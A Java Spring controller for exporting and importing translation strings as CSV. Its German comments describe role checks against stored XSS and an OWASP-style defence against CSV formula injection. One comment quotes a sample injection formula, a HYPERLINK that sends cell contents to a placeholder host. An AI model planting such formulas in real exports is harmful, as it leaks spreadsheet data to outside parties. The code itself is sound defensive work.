/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at https://mozilla.org/MPL/2.0/. */
package ch.plaintext.i18n.web;

import ch.plaintext.i18n.entity.I18nTranslation;
import ch.plaintext.i18n.service.I18nService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

/**
 * REST controller for exporting and importing i18n translations as CSV.
 * <p>
 * CSV format: defaultLabel;languageCode;translatedText
 * (semicolon-separated to avoid conflicts with commas in text)
 * <p>
 * Endpoints:
 * <ul>
 *   <li>GET /api/i18n/export - export all translations</li>
 *   <li>GET /api/i18n/export?lang=en - export translations for a specific language</li>
 *   <li>GET /api/i18n/export?untranslated=true - export only untranslated (X_) entries</li>
 *   <li>POST /api/i18n/import - import translations from CSV upload</li>
 * </ul>
 *
 * <p><b>SECURITY (Karte 304):</b> Beide Endpunkte sind ausschliesslich fuer ADMIN/ROOT gedacht.
 * Uebersetzungen sind <em>global</em> (die Entity {@code I18nTranslation} hat keine
 * {@code mandat}-Spalte) und landen auf Admin-Seiten wie {@code useradmin.xhtml} — ein
 * beliebiger {@code ROLE_USER} durfte sie vorher ueberschreiben (Stored XSS im Admin-Kontext)
 * bzw. komplett exportieren.
 * <p>Die primaere Absicherung ist der Pfad-Matcher
 * {@code /api/i18n/** -> hasAnyRole("ADMIN","ROOT")} in {@code PlaintextSecurityConfig}. Der
 * Check hier ist die zweite Verteidigungslinie fuer den Fall, dass eine konsumierende App die
 * Filter-Chain-Regel verliert (z.B. ueber ein zu weites {@code permitAllPatterns}).
 * {@code @PreAuthorize} ist bewusst NICHT verwendet: im Framework ist nirgends
 * {@code @EnableMethodSecurity} aktiv, die Annotation waere eine stille Attrappe.
 */
@RestController
@RequestMapping("/api/i18n")
@Slf4j
public class I18nExportController {

    private static final String CSV_SEPARATOR = ";";
    private static final String CSV_HEADER = "defaultLabel;languageCode;translatedText";

    /** Rollen, die Uebersetzungen lesen/schreiben duerfen (Authorities sind {@code ROLE_<UPPERCASE>}). */
    private static final Set<String> ERLAUBTE_AUTHORITIES = Set.of("ROLE_ADMIN", "ROLE_ROOT");

    private final I18nService i18nService;

    public I18nExportController(I18nService i18nService) {
        this.i18nService = i18nService;
    }

    /**
     * Zweite Verteidigungslinie: prueft die Rolle programmatisch am SecurityContext.
     *
     * @return true, wenn der aktuelle Principal ADMIN oder ROOT ist
     */
    private boolean istBerechtigt() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth == null || !auth.isAuthenticated()) {
            return false;
        }
        // AnonymousAuthenticationToken ist "authenticated", traegt aber nur ROLE_ANONYMOUS
        // und faellt damit durch die Authority-Pruefung.
        return auth.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .anyMatch(ERLAUBTE_AUTHORITIES::contains);
    }

    /** Loggt die Ablehnung und liefert 403. */
    private <T> ResponseEntity<T> verweigert(String endpunkt) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        log.warn("SECURITY: Zugriff auf {} ohne ADMIN/ROOT-Rolle abgelehnt (user={})",
                endpunkt, auth == null ? "anonym" : auth.getName());
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }

    /**
     * Export translations as CSV file.
     *
     * @param lang optional language filter (e.g., "en", "fr")
     * @param untranslated if true, only export entries with X_ prefix
     * @return CSV file download
     */
    @GetMapping("/export")
    public ResponseEntity<byte[]> exportCsv(
            @RequestParam(required = false) String lang,
            @RequestParam(required = false, defaultValue = "false") boolean untranslated) {

        if (!istBerechtigt()) {
            return verweigert("GET /api/i18n/export");
        }

        List<I18nTranslation> translations;

        if (untranslated) {
            translations = (lang != null && !lang.isBlank())
                    ? i18nService.getUntranslatedEntries(lang)
                    : i18nService.getUntranslatedEntries();
        } else {
            translations = (lang != null && !lang.isBlank())
                    ? i18nService.getTranslationsByLanguage(lang)
                    : i18nService.getAllTranslations();
        }

        StringBuilder csv = new StringBuilder();
        csv.append(CSV_HEADER).append("\n");

        for (I18nTranslation t : translations) {
            csv.append(escapeCsv(t.getDefaultLabel()))
               .append(CSV_SEPARATOR)
               .append(escapeCsv(t.getLanguageCode()))
               .append(CSV_SEPARATOR)
               .append(escapeCsv(t.getTranslatedText()))
               .append("\n");
        }

        byte[] content = csv.toString().getBytes(StandardCharsets.UTF_8);

        String filename = "i18n-translations";
        if (lang != null && !lang.isBlank()) {
            filename += "-" + lang;
        }
        if (untranslated) {
            filename += "-untranslated";
        }
        filename += ".csv";

        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + filename + "\"")
                .contentType(MediaType.parseMediaType("text/csv; charset=UTF-8"))
                .contentLength(content.length)
                .body(content);
    }

    /**
     * Import translations from a CSV file upload.
     * <p>
     * Expected CSV format (semicolon-separated):
     * defaultLabel;languageCode;translatedText
     * <p>
     * Lines starting with "#" are treated as comments and skipped.
     * The first line is skipped if it matches the header.
     *
     * @param file the CSV file to import
     * @return summary of import results
     */
    @PostMapping("/import")
    public ResponseEntity<ImportResult> importCsv(@RequestParam("file") MultipartFile file) {
        if (!istBerechtigt()) {
            return verweigert("POST /api/i18n/import");
        }
        if (file.isEmpty()) {
            return ResponseEntity.badRequest()
                    .body(new ImportResult(0, 0, List.of("File is empty")));
        }

        int imported = 0;
        int skipped = 0;
        List<String> errors = new ArrayList<>();

        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(file.getInputStream(), StandardCharsets.UTF_8))) {

            String line;
            int lineNumber = 0;

            while ((line = reader.readLine()) != null) {
                lineNumber++;

                // Skip empty lines and comments
                if (line.isBlank() || line.startsWith("#")) {
                    continue;
                }

                // Skip header line
                if (lineNumber == 1 && line.startsWith("defaultLabel")) {
                    continue;
                }

                String[] parts = line.split(CSV_SEPARATOR, 3);
                if (parts.length < 3) {
                    errors.add("Line " + lineNumber + ": expected 3 columns, got " + parts.length);
                    skipped++;
                    continue;
                }

                String defaultLabel = unescapeCsv(parts[0].trim());
                String languageCode = unescapeCsv(parts[1].trim());
                String translatedText = unescapeCsv(parts[2].trim());

                if (defaultLabel.isEmpty() || languageCode.isEmpty()) {
                    errors.add("Line " + lineNumber + ": defaultLabel and languageCode must not be empty");
                    skipped++;
                    continue;
                }

                try {
                    i18nService.saveTranslation(defaultLabel, languageCode, translatedText);
                    imported++;
                } catch (Exception e) {
                    errors.add("Line " + lineNumber + ": " + e.getMessage());
                    skipped++;
                }
            }

        } catch (Exception e) {
            log.error("Error importing CSV", e);
            return ResponseEntity.internalServerError()
                    .body(new ImportResult(imported, skipped, List.of("Error reading file: " + e.getMessage())));
        }

        log.info("CSV import completed: {} imported, {} skipped, {} errors", imported, skipped, errors.size());
        return ResponseEntity.ok(new ImportResult(imported, skipped, errors));
    }

    /**
     * SECURITY (Karte 314, Punkt 15): Zeichen, mit denen Excel/LibreOffice/Google Sheets eine
     * Zelle als FORMEL interpretieren. Ein Uebersetzungstext wie
     * {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")} landet ueber den Export in der
     * Tabelle des Empfaengers und wird dort beim Oeffnen ausgefuehrt (CSV-/Formula-Injection).
     */
    private static final String CSV_FORMULA_TRIGGERS = "=+-@\t\r";

    /**
     * Escape a value for CSV output. Wraps in quotes if it contains the separator, quotes, or newlines.
     *
     * <p>SECURITY (Karte 314, Punkt 15): fuehrende Formel-Trigger werden zusaetzlich mit einem
     * einfachen Anfuehrungszeichen neutralisiert. Das ist die von OWASP empfohlene Variante: der
     * Wert bleibt in der Tabelle lesbar, wird aber garantiert als Text behandelt. Der Re-Import
     * ueber {@link #unescapeCsv(String)} entfernt das Zeichen wieder, damit Export -> Import
     * verlustfrei bleibt.
     */
    private String escapeCsv(String value) {
        if (value == null) {
            return "";
        }
        String safe = value;
        if (!safe.isEmpty() && CSV_FORMULA_TRIGGERS.indexOf(safe.charAt(0)) >= 0) {
            safe = "'" + safe;
        }
        if (safe.contains(CSV_SEPARATOR) || safe.contains("\"") || safe.contains("\n")) {
            return "\"" + safe.replace("\"", "\"\"") + "\"";
        }
        return safe;
    }

    /**
     * Unescape a CSV value (remove surrounding quotes, unescape doubled quotes).
     *
     * <p>SECURITY (Karte 314, Punkt 15): entfernt zusaetzlich das beim Export vorangestellte
     * Schutz-Apostroph wieder, damit ein Export -> Import-Zyklus den Originaltext
     * wiederherstellt und nicht bei jedem Durchlauf ein weiteres Apostroph anwaechst.
     */
    private String unescapeCsv(String value) {
        if (value == null) {
            return "";
        }
        String result = value;
        if (result.startsWith("\"") && result.endsWith("\"") && result.length() >= 2) {
            result = result.substring(1, result.length() - 1).replace("\"\"", "\"");
        }
        if (result.length() >= 2 && result.charAt(0) == '\''
                && CSV_FORMULA_TRIGGERS.indexOf(result.charAt(1)) >= 0) {
            result = result.substring(1);
        }
        return result;
    }

    /**
     * Result DTO for CSV import.
     */
    public record ImportResult(int imported, int skipped, List<String> errors) {
    }
}
